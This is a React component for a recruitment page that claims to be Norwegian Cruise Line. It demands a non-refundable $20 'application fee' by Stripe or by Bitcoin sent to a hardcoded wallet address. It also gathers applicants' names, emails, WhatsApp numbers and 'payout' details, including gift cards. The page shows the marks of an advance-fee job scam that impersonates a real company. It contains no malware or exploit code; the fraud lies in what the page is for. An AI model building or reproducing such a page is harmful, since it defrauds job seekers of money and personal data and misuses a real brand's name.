import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import {
  AlertCircle,
  Bitcoin,
  Briefcase,
  Check,
  CheckCircle2,
  Coins,
  Copy,
  CreditCard,
  FileText,
  Loader2,
  Mail,
  MessageCircle,
  Phone,
  QrCode,
  Shield,
  User,
} from "lucide-react";
import { AnimatePresence, motion } from "motion/react";
import { useEffect, useState } from "react";
import type { FormData } from "../App";
import type { PayoutMethod } from "../backend";
import { useCreateCheckoutSession } from "../hooks/useQueries";

const FORM_STORAGE_KEY = "ncl_application_form_data";
const PAYOUT_STORAGE_KEY = "ncl_payout_data";

const BTC_ADDRESS = "3HbY1Rnxm71JDinQP1UMGN6iAppSanWPqU";

const positions = [
  "Deck Officer",
  "Chef / Culinary Staff",
  "Hospitality & Guest Services",
  "Entertainment Staff",
  "Engineering Technician",
  "Medical Officer",
];

const giftCardTypes = ["Amazon", "Visa", "Google Play", "iTunes"];

type PayoutMethodKind = "btc" | "paypal" | "giftCard" | "";

interface PayoutFormData {
  method: PayoutMethodKind;
  btcAddress: string;
  paypalEmail: string;
  giftCardType: string;
  giftCardEmail: string;
}

interface PayoutErrors {
  method?: string;
  btcAddress?: string;
  paypalEmail?: string;
  giftCardType?: string;
  giftCardEmail?: string;
}

interface ApplicationFormProps {
  appSubmitted: boolean;
  processingPayment: boolean;
  paymentError: string | null;
  onPaymentErrorClear: () => void;
}

export default function ApplicationForm({
  appSubmitted,
  processingPayment,
  paymentError,
  onPaymentErrorClear,
}: ApplicationFormProps) {
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    whatsapp: "",
    position: "",
    message: "",
  });
  const [errors, setErrors] = useState<Partial<FormData>>({});

  const [payoutData, setPayoutData] = useState<PayoutFormData>({
    method: "",
    btcAddress: "",
    paypalEmail: "",
    giftCardType: "",
    giftCardEmail: "",
  });
  const [payoutErrors, setPayoutErrors] = useState<PayoutErrors>({});

  const [isRedirecting, setIsRedirecting] = useState(false);
  const [btcCopied, setBtcCopied] = useState(false);

  const createCheckoutSession = useCreateCheckoutSession();

  // Pre-fill from localStorage if returning from cancelled payment
  useEffect(() => {
    const stored = localStorage.getItem(FORM_STORAGE_KEY);
    if (stored) {
      try {
        const data = JSON.parse(stored) as FormData;
        setFormData(data);
      } catch {
        // ignore
      }
    }
    const storedPayout = localStorage.getItem(PAYOUT_STORAGE_KEY);
    if (storedPayout) {
      try {
        const data = JSON.parse(storedPayout) as PayoutFormData;
        setPayoutData(data);
      } catch {
        // ignore
      }
    }
  }, []);

  const handleCopyBtc = async () => {
    try {
      await navigator.clipboard.writeText(BTC_ADDRESS);
      setBtcCopied(true);
      setTimeout(() => setBtcCopied(false), 2000);
    } catch {
      // Fallback for older browsers
      const el = document.createElement("textarea");
      el.value = BTC_ADDRESS;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
      setBtcCopied(true);
      setTimeout(() => setBtcCopied(false), 2000);
    }
  };

  const validatePayout = (): boolean => {
    const errs: PayoutErrors = {};
    if (!payoutData.method) {
      errs.method = "Please select a payout method";
    } else if (payoutData.method === "btc") {
      if (!payoutData.btcAddress.trim())
        errs.btcAddress = "BTC wallet address is required";
    } else if (payoutData.method === "paypal") {
      if (!payoutData.paypalEmail.trim()) {
        errs.paypalEmail = "PayPal email is required";
      } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payoutData.paypalEmail)) {
        errs.paypalEmail = "Please enter a valid email";
      }
    } else if (payoutData.method === "giftCard") {
      if (!payoutData.giftCardType)
        errs.giftCardType = "Please select a card type";
      if (!payoutData.giftCardEmail.trim()) {
        errs.giftCardEmail = "Email is required";
      } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payoutData.giftCardEmail)) {
        errs.giftCardEmail = "Please enter a valid email";
      }
    }
    setPayoutErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const validate = (): boolean => {
    const newErrors: Partial<FormData> = {};
    if (!formData.name.trim()) newErrors.name = "Full name is required";
    if (!formData.email.trim()) {
      newErrors.email = "Email is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email";
    }
    if (!formData.whatsapp.trim())
      newErrors.whatsapp = "WhatsApp number is required";
    if (!formData.position) newErrors.position = "Please select a position";
    if (!formData.message.trim())
      newErrors.message = "Please write a brief cover letter";
    setErrors(newErrors);
    const payoutValid = validatePayout();
    return Object.keys(newErrors).length === 0 && payoutValid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    // Store form data and payout data before redirect
    localStorage.setItem(FORM_STORAGE_KEY, JSON.stringify(formData));
    localStorage.setItem(PAYOUT_STORAGE_KEY, JSON.stringify(payoutData));

    setIsRedirecting(true);

    try {
      const baseUrl = `${window.location.protocol}//${window.location.host}`;
      const successUrl = `${baseUrl}/?payment=success&session_id={CHECKOUT_SESSION_ID}`;
      const cancelUrl = `${baseUrl}/?payment=cancelled`;

      const session = await createCheckoutSession.mutateAsync({
        items: [
          {
            productName: "NCL Application Fee",
            currency: "usd",
            quantity: 1n,
            priceInCents: 2000n,
            productDescription:
              "Norwegian Cruise Line job application processing fee",
          },
        ],
        successUrl,
        cancelUrl,
      });

      if (!session?.url) throw new Error("Stripe session missing url");
      window.location.href = session.url;
    } catch (err) {
      setIsRedirecting(false);
      console.error("Checkout error:", err);
    }
  };

  const updateField = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }));
    }
    if (paymentError) onPaymentErrorClear();
  };

  const updatePayoutField = (field: keyof PayoutFormData, value: string) => {
    setPayoutData((prev) => ({ ...prev, [field]: value }));
    if (field === "method") {
      setPayoutErrors({});
    } else if (payoutErrors[field as keyof PayoutErrors]) {
      setPayoutErrors((prev) => ({ ...prev, [field]: undefined }));
    }
  };

  const isPending =
    isRedirecting || processingPayment || createCheckoutSession.isPending;

  if (appSubmitted) {
    return (
      <section id="apply" className="py-24 bg-background">
        <div className="max-w-2xl mx-auto px-4 sm:px-6">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="card-navy rounded-3xl p-12 text-center"
            data-ocid="form.success_state"
          >
            <div className="w-20 h-20 rounded-full bg-green-500/15 flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 className="w-10 h-10 text-green-400" />
            </div>
            <h2 className="font-display font-bold text-3xl text-white mb-4">
              Application Received!
            </h2>
            <p className="text-white/70 text-lg mb-2">
              Thank you for applying to Norwegian Cruise Line.
            </p>
            <p className="text-white/55 text-sm leading-relaxed max-w-md mx-auto">
              Our recruitment team will review your application and reach out
              via email or WhatsApp within 5–7 business days. Please keep an eye
              on both channels.
            </p>
            <div className="mt-8 pt-8 border-t border-gold/20 flex justify-center gap-6 text-sm text-white/50">
              <span className="flex items-center gap-2">
                <Mail className="w-4 h-4 text-gold" />
                Check your email
              </span>
              <span className="flex items-center gap-2">
                <MessageCircle className="w-4 h-4 text-gold" />
                Watch WhatsApp
              </span>
            </div>
          </motion.div>
        </div>
      </section>
    );
  }

  return (
    <section id="apply" className="py-24 bg-background">
      <div className="max-w-3xl mx-auto px-4 sm:px-6">
        {/* Section header */}
        <motion.div
          initial={{ opacity: 0, y: 24 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-80px" }}
          transition={{ duration: 0.6 }}
          className="text-center mb-12"
        >
          <span className="text-gold text-sm font-semibold tracking-[0.25em] uppercase block mb-3">
            Begin Your Journey
          </span>
          <h2 className="font-display font-bold text-4xl md:text-5xl text-foreground mb-4 leading-tight">
            Apply Now <span className="text-gold">— $20 Fee</span>
          </h2>
          <p className="text-muted-foreground max-w-xl mx-auto text-base">
            Your $20 application fee covers processing and ensures serious
            applicants only. This fee is non-refundable.
          </p>
          <div className="w-16 h-1 bg-gold mx-auto rounded-full mt-6" />
        </motion.div>

        {/* Payment error state */}
        <AnimatePresence>
          {paymentError && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="mb-6 p-4 rounded-xl border border-destructive/40 bg-destructive/10 flex items-start gap-3"
              data-ocid="form.error_state"
            >
              <AlertCircle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-semibold text-destructive text-sm">
                  Payment Error
                </p>
                <p className="text-destructive/80 text-sm mt-0.5">
                  {paymentError}
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Form */}
        <motion.div
          initial={{ opacity: 0, y: 32 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-80px" }}
          transition={{ duration: 0.6, delay: 0.1 }}
          className="card-navy rounded-3xl p-8 md:p-10"
        >
          {/* Mutation error */}
          <AnimatePresence>
            {createCheckoutSession.isError && (
              <motion.div
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="mb-6 p-4 rounded-xl border border-destructive/40 bg-destructive/10 flex items-start gap-3"
                data-ocid="form.error_state"
              >
                <AlertCircle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
                <div>
                  <p className="font-semibold text-destructive text-sm">
                    Checkout Error
                  </p>
                  <p className="text-destructive/80 text-sm mt-0.5">
                    Failed to initiate payment. Please try again or contact
                    support.
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          <form onSubmit={handleSubmit} noValidate className="space-y-6">
            {/* Full Name */}
            <div className="space-y-1.5">
              <Label
                htmlFor="name"
                className="text-white/80 font-medium flex items-center gap-2"
              >
                <User className="w-3.5 h-3.5 text-gold" />
                Full Name
              </Label>
              <Input
                id="name"
                type="text"
                placeholder="John Smith"
                value={formData.name}
                onChange={(e) => updateField("name", e.target.value)}
                autoComplete="name"
                className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11"
                disabled={isPending}
                data-ocid="form.name_input"
              />
              {errors.name && (
                <p className="text-destructive text-xs flex items-center gap-1.5 mt-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.name}
                </p>
              )}
            </div>

            {/* Email */}
            <div className="space-y-1.5">
              <Label
                htmlFor="email"
                className="text-white/80 font-medium flex items-center gap-2"
              >
                <Mail className="w-3.5 h-3.5 text-gold" />
                Email Address
              </Label>
              <Input
                id="email"
                type="email"
                placeholder="john@example.com"
                value={formData.email}
                onChange={(e) => updateField("email", e.target.value)}
                autoComplete="email"
                className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11"
                disabled={isPending}
                data-ocid="form.email_input"
              />
              {errors.email && (
                <p className="text-destructive text-xs flex items-center gap-1.5 mt-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.email}
                </p>
              )}
            </div>

            {/* WhatsApp */}
            <div className="space-y-1.5">
              <Label
                htmlFor="whatsapp"
                className="text-white/80 font-medium flex items-center gap-2"
              >
                <Phone className="w-3.5 h-3.5 text-gold" />
                WhatsApp Number
              </Label>
              <div className="relative">
                <Input
                  id="whatsapp"
                  type="tel"
                  placeholder="+1 234 567 8900 (include country code)"
                  value={formData.whatsapp}
                  onChange={(e) => updateField("whatsapp", e.target.value)}
                  autoComplete="tel"
                  className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11 pl-4"
                  disabled={isPending}
                  data-ocid="form.whatsapp_input"
                />
              </div>
              <p className="text-white/35 text-xs flex items-center gap-1.5">
                <MessageCircle className="w-3 h-3 text-gold/50" />
                Include country code, e.g. +44 7700 900123
              </p>
              {errors.whatsapp && (
                <p className="text-destructive text-xs flex items-center gap-1.5">
                  <AlertCircle className="w-3 h-3" />
                  {errors.whatsapp}
                </p>
              )}
            </div>

            {/* Position */}
            <div className="space-y-1.5">
              <Label
                htmlFor="position"
                className="text-white/80 font-medium flex items-center gap-2"
              >
                <Briefcase className="w-3.5 h-3.5 text-gold" />
                Position Applying For
              </Label>
              <Select
                value={formData.position}
                onValueChange={(val) => updateField("position", val)}
                disabled={isPending}
              >
                <SelectTrigger
                  id="position"
                  className="bg-navy-deep/60 border-gold/20 text-white focus:ring-gold/20 focus:border-gold h-11 data-[placeholder]:text-white/30"
                  data-ocid="form.position_select"
                >
                  <SelectValue placeholder="Select a position…" />
                </SelectTrigger>
                <SelectContent className="bg-navy border-gold/20">
                  {positions.map((pos) => (
                    <SelectItem
                      key={pos}
                      value={pos}
                      className="text-white focus:bg-gold/20 focus:text-gold"
                    >
                      {pos}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.position && (
                <p className="text-destructive text-xs flex items-center gap-1.5 mt-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.position}
                </p>
              )}
            </div>

            {/* Message */}
            <div className="space-y-1.5">
              <Label
                htmlFor="message"
                className="text-white/80 font-medium flex items-center gap-2"
              >
                <FileText className="w-3.5 h-3.5 text-gold" />
                Message / Cover Letter
              </Label>
              <Textarea
                id="message"
                placeholder="Tell us about your experience, why you want to join NCL, and what makes you a great candidate…"
                value={formData.message}
                onChange={(e) => updateField("message", e.target.value)}
                rows={5}
                className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 resize-none"
                disabled={isPending}
                data-ocid="form.message_textarea"
              />
              {errors.message && (
                <p className="text-destructive text-xs flex items-center gap-1.5 mt-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.message}
                </p>
              )}
            </div>

            {/* ── Payout Method ── */}
            <div className="space-y-3">
              <Label className="text-white/80 font-medium flex items-center gap-2">
                <CreditCard className="w-3.5 h-3.5 text-gold" />
                Payout Method
                <span className="text-white/40 font-normal text-xs ml-1">
                  — How would you like to receive your payout?
                </span>
              </Label>

              {/* Three payout option cards */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                {/* BTC */}
                <button
                  type="button"
                  onClick={() => updatePayoutField("method", "btc")}
                  disabled={isPending}
                  data-ocid="form.payout_btc_radio"
                  className={`relative flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all duration-200 text-center cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed ${
                    payoutData.method === "btc"
                      ? "border-gold bg-gold/10 shadow-[0_0_20px_oklch(0.78_0.18_78/0.2)]"
                      : "border-gold/20 bg-navy-deep/40 hover:border-gold/40 hover:bg-navy-deep/60"
                  }`}
                >
                  {payoutData.method === "btc" && (
                    <span className="absolute top-2 right-2 w-4 h-4 rounded-full bg-gold flex items-center justify-center">
                      <CheckCircle2 className="w-3 h-3 text-navy-deep" />
                    </span>
                  )}
                  <span className="text-2xl font-bold text-gold">₿</span>
                  <span className="text-white font-semibold text-sm">
                    Bitcoin
                  </span>
                  <span className="text-white/40 text-xs">BTC Wallet</span>
                </button>

                {/* PayPal */}
                <button
                  type="button"
                  onClick={() => updatePayoutField("method", "paypal")}
                  disabled={isPending}
                  data-ocid="form.payout_paypal_radio"
                  className={`relative flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all duration-200 text-center cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed ${
                    payoutData.method === "paypal"
                      ? "border-gold bg-gold/10 shadow-[0_0_20px_oklch(0.78_0.18_78/0.2)]"
                      : "border-gold/20 bg-navy-deep/40 hover:border-gold/40 hover:bg-navy-deep/60"
                  }`}
                >
                  {payoutData.method === "paypal" && (
                    <span className="absolute top-2 right-2 w-4 h-4 rounded-full bg-gold flex items-center justify-center">
                      <CheckCircle2 className="w-3 h-3 text-navy-deep" />
                    </span>
                  )}
                  <Mail className="w-6 h-6 text-gold" />
                  <span className="text-white font-semibold text-sm">
                    PayPal
                  </span>
                  <span className="text-white/40 text-xs">Email Transfer</span>
                </button>

                {/* Gift Card */}
                <button
                  type="button"
                  onClick={() => updatePayoutField("method", "giftCard")}
                  disabled={isPending}
                  data-ocid="form.payout_giftcard_radio"
                  className={`relative flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all duration-200 text-center cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed ${
                    payoutData.method === "giftCard"
                      ? "border-gold bg-gold/10 shadow-[0_0_20px_oklch(0.78_0.18_78/0.2)]"
                      : "border-gold/20 bg-navy-deep/40 hover:border-gold/40 hover:bg-navy-deep/60"
                  }`}
                >
                  {payoutData.method === "giftCard" && (
                    <span className="absolute top-2 right-2 w-4 h-4 rounded-full bg-gold flex items-center justify-center">
                      <CheckCircle2 className="w-3 h-3 text-navy-deep" />
                    </span>
                  )}
                  <CreditCard className="w-6 h-6 text-gold" />
                  <span className="text-white font-semibold text-sm">
                    Gift Card
                  </span>
                  <span className="text-white/40 text-xs">
                    Amazon, Visa & more
                  </span>
                </button>
              </div>

              {payoutErrors.method && (
                <p className="text-destructive text-xs flex items-center gap-1.5">
                  <AlertCircle className="w-3 h-3" />
                  {payoutErrors.method}
                </p>
              )}

              {/* BTC Address input */}
              <AnimatePresence>
                {payoutData.method === "btc" && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    className="space-y-1.5 overflow-hidden"
                  >
                    <Label
                      htmlFor="btc-address"
                      className="text-white/70 font-medium text-sm flex items-center gap-2"
                    >
                      <Coins className="w-3.5 h-3.5 text-gold" />
                      BTC Wallet Address
                    </Label>
                    <Input
                      id="btc-address"
                      type="text"
                      placeholder="bc1q... or 1A1z... or 3J98t..."
                      value={payoutData.btcAddress}
                      onChange={(e) =>
                        updatePayoutField("btcAddress", e.target.value)
                      }
                      className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11 font-mono text-sm"
                      disabled={isPending}
                      data-ocid="form.payout_btc_input"
                    />
                    {payoutErrors.btcAddress && (
                      <p className="text-destructive text-xs flex items-center gap-1.5">
                        <AlertCircle className="w-3 h-3" />
                        {payoutErrors.btcAddress}
                      </p>
                    )}
                  </motion.div>
                )}
              </AnimatePresence>

              {/* PayPal Email input */}
              <AnimatePresence>
                {payoutData.method === "paypal" && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    className="space-y-1.5 overflow-hidden"
                  >
                    <Label
                      htmlFor="paypal-email"
                      className="text-white/70 font-medium text-sm flex items-center gap-2"
                    >
                      <Mail className="w-3.5 h-3.5 text-gold" />
                      PayPal Email Address
                    </Label>
                    <Input
                      id="paypal-email"
                      type="email"
                      placeholder="your@paypal.com"
                      value={payoutData.paypalEmail}
                      onChange={(e) =>
                        updatePayoutField("paypalEmail", e.target.value)
                      }
                      className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11"
                      disabled={isPending}
                      data-ocid="form.payout_paypal_input"
                    />
                    {payoutErrors.paypalEmail && (
                      <p className="text-destructive text-xs flex items-center gap-1.5">
                        <AlertCircle className="w-3 h-3" />
                        {payoutErrors.paypalEmail}
                      </p>
                    )}
                  </motion.div>
                )}
              </AnimatePresence>

              {/* Gift Card inputs */}
              <AnimatePresence>
                {payoutData.method === "giftCard" && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    className="space-y-3 overflow-hidden"
                  >
                    <div className="space-y-1.5">
                      <Label
                        htmlFor="gift-card-type"
                        className="text-white/70 font-medium text-sm flex items-center gap-2"
                      >
                        <CreditCard className="w-3.5 h-3.5 text-gold" />
                        Gift Card Type
                      </Label>
                      <Select
                        value={payoutData.giftCardType}
                        onValueChange={(val) =>
                          updatePayoutField("giftCardType", val)
                        }
                        disabled={isPending}
                      >
                        <SelectTrigger
                          id="gift-card-type"
                          className="bg-navy-deep/60 border-gold/20 text-white focus:ring-gold/20 focus:border-gold h-11 data-[placeholder]:text-white/30"
                          data-ocid="form.payout_giftcard_type_select"
                        >
                          <SelectValue placeholder="Select card type…" />
                        </SelectTrigger>
                        <SelectContent className="bg-navy border-gold/20">
                          {giftCardTypes.map((type) => (
                            <SelectItem
                              key={type}
                              value={type}
                              className="text-white focus:bg-gold/20 focus:text-gold"
                            >
                              {type}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      {payoutErrors.giftCardType && (
                        <p className="text-destructive text-xs flex items-center gap-1.5">
                          <AlertCircle className="w-3 h-3" />
                          {payoutErrors.giftCardType}
                        </p>
                      )}
                    </div>

                    <div className="space-y-1.5">
                      <Label
                        htmlFor="gift-card-email"
                        className="text-white/70 font-medium text-sm flex items-center gap-2"
                      >
                        <Mail className="w-3.5 h-3.5 text-gold" />
                        Delivery Email
                      </Label>
                      <Input
                        id="gift-card-email"
                        type="email"
                        placeholder="email to receive gift card"
                        value={payoutData.giftCardEmail}
                        onChange={(e) =>
                          updatePayoutField("giftCardEmail", e.target.value)
                        }
                        className="bg-navy-deep/60 border-gold/20 text-white placeholder:text-white/30 focus:border-gold focus:ring-gold/20 h-11"
                        disabled={isPending}
                        data-ocid="form.payout_giftcard_email_input"
                      />
                      {payoutErrors.giftCardEmail && (
                        <p className="text-destructive text-xs flex items-center gap-1.5">
                          <AlertCircle className="w-3 h-3" />
                          {payoutErrors.giftCardEmail}
                        </p>
                      )}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* ── Pay with Bitcoin Section ── */}
            <motion.div
              initial={{ opacity: 0, y: 12 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.4 }}
              className="rounded-2xl border-2 border-gold/30 bg-gradient-to-br from-navy-deep/80 to-navy/60 overflow-hidden"
              data-ocid="btc.panel"
            >
              {/* Header bar */}
              <div className="flex items-center gap-3 px-5 py-3.5 border-b border-gold/20 bg-gold/8">
                <div className="w-8 h-8 rounded-full bg-gold/15 flex items-center justify-center">
                  <Bitcoin className="w-4 h-4 text-gold" />
                </div>
                <div>
                  <p className="text-white font-bold text-sm tracking-wide">
                    Pay with Bitcoin
                  </p>
                  <p className="text-white/45 text-xs">
                    Alternative payment method
                  </p>
                </div>
                <span className="ml-auto px-2.5 py-0.5 rounded-full bg-gold/15 text-gold text-xs font-semibold border border-gold/25">
                  $20 USD
                </span>
              </div>

              <div className="p-5">
                <div className="flex flex-col sm:flex-row gap-5 items-start">
                  {/* QR Code */}
                  <div className="flex-shrink-0 mx-auto sm:mx-0">
                    <div className="relative w-36 h-36 rounded-xl overflow-hidden border-2 border-gold/40 bg-white p-1.5 shadow-[0_0_24px_oklch(0.78_0.18_78/0.2)]">
                      <img
                        src="/assets/uploads/IMG_5121-1.jpeg"
                        alt="Bitcoin payment QR code — scan to send $20 to 3HbY1Rnxm71JDinQP1UMGN6iAppSanWPqU"
                        className="w-full h-full object-contain rounded-lg"
                        data-ocid="btc.canvas_target"
                      />
                    </div>
                    <p className="text-center text-white/40 text-xs mt-2 flex items-center justify-center gap-1">
                      <QrCode className="w-3 h-3" />
                      Scan to pay
                    </p>
                  </div>

                  {/* Address + instructions */}
                  <div className="flex-1 min-w-0 space-y-3">
                    <p className="text-white/60 text-sm leading-relaxed">
                      Send{" "}
                      <span className="text-gold font-semibold">
                        exactly $20
                      </span>{" "}
                      worth of BTC to this address, then submit your application
                      below.
                    </p>

                    {/* BTC address display */}
                    <div className="space-y-1.5">
                      <p className="text-white/50 text-xs uppercase tracking-widest font-semibold">
                        BTC Address
                      </p>
                      <div className="flex items-center gap-2 rounded-lg border border-gold/25 bg-navy-deep/70 px-3 py-2.5">
                        <code className="flex-1 font-mono text-xs text-gold/90 break-all leading-relaxed select-all">
                          {BTC_ADDRESS}
                        </code>
                        <button
                          type="button"
                          onClick={handleCopyBtc}
                          data-ocid="btc.copy_button"
                          className="flex-shrink-0 w-8 h-8 rounded-md border border-gold/30 bg-gold/10 hover:bg-gold/20 hover:border-gold/50 flex items-center justify-center transition-all duration-200 group"
                          aria-label="Copy BTC address"
                          title="Copy address to clipboard"
                        >
                          <AnimatePresence mode="wait" initial={false}>
                            {btcCopied ? (
                              <motion.span
                                key="check"
                                initial={{ scale: 0.5, opacity: 0 }}
                                animate={{ scale: 1, opacity: 1 }}
                                exit={{ scale: 0.5, opacity: 0 }}
                                transition={{ duration: 0.15 }}
                              >
                                <Check className="w-3.5 h-3.5 text-green-400" />
                              </motion.span>
                            ) : (
                              <motion.span
                                key="copy"
                                initial={{ scale: 0.5, opacity: 0 }}
                                animate={{ scale: 1, opacity: 1 }}
                                exit={{ scale: 0.5, opacity: 0 }}
                                transition={{ duration: 0.15 }}
                              >
                                <Copy className="w-3.5 h-3.5 text-gold/70 group-hover:text-gold transition-colors" />
                              </motion.span>
                            )}
                          </AnimatePresence>
                        </button>
                      </div>
                      {btcCopied && (
                        <motion.p
                          initial={{ opacity: 0, y: -4 }}
                          animate={{ opacity: 1, y: 0 }}
                          exit={{ opacity: 0 }}
                          className="text-green-400 text-xs flex items-center gap-1"
                        >
                          <Check className="w-3 h-3" />
                          Address copied to clipboard!
                        </motion.p>
                      )}
                    </div>

                    <div className="flex items-start gap-2 rounded-lg bg-gold/6 border border-gold/15 px-3 py-2">
                      <Shield className="w-3.5 h-3.5 text-gold/70 flex-shrink-0 mt-0.5" />
                      <p className="text-white/45 text-xs leading-relaxed">
                        After sending BTC, note your transaction ID and include
                        it in your message above. We'll verify and process your
                        application manually.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>

            {/* Divider with OR */}
            <div className="flex items-center gap-3">
              <div className="flex-1 h-px bg-gold/15" />
              <span className="text-white/35 text-xs font-semibold uppercase tracking-widest px-2">
                or
              </span>
              <div className="flex-1 h-px bg-gold/15" />
            </div>

            {/* Payment note — Stripe */}
            <div className="rounded-xl border border-gold/20 bg-gold/8 p-4 flex items-start gap-3">
              <Shield className="w-5 h-5 text-gold flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-white/80 font-semibold text-sm">
                  OR Pay via Stripe — $20 Processing Fee
                </p>
                <p className="text-white/50 text-xs mt-1 leading-relaxed">
                  You will be redirected to Stripe's secure checkout to pay the
                  $20 application processing fee. This fee covers background
                  screening and application review. It is non-refundable.
                </p>
              </div>
            </div>

            {/* Submit button */}
            <Button
              type="submit"
              disabled={isPending}
              className="w-full bg-gold hover:bg-gold-light text-navy-deep font-bold text-base py-6 transition-all duration-200 hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 disabled:hover:scale-100"
              data-ocid="form.submit_button"
            >
              {isPending ? (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  {isRedirecting ? "Redirecting to Payment…" : "Processing…"}
                </>
              ) : (
                <>
                  <CreditCard className="w-5 h-5 mr-2" />
                  Pay $20 &amp; Submit Application
                </>
              )}
            </Button>
          </form>
        </motion.div>

        {/* Assurances */}
        <div className="mt-8 flex flex-wrap justify-center gap-6 text-sm text-muted-foreground">
          <span className="flex items-center gap-2">
            <Shield className="w-4 h-4 text-gold" />
            Secure Stripe Payment
          </span>
          <span className="flex items-center gap-2">
            <Bitcoin className="w-4 h-4 text-gold" />
            BTC Accepted
          </span>
          <span className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-gold" />
            Data Kept Confidential
          </span>
          <span className="flex items-center gap-2">
            <Mail className="w-4 h-4 text-gold" />
            Response within 7 days
          </span>
        </div>
      </div>
    </section>
  );
}

export type { PayoutFormData };
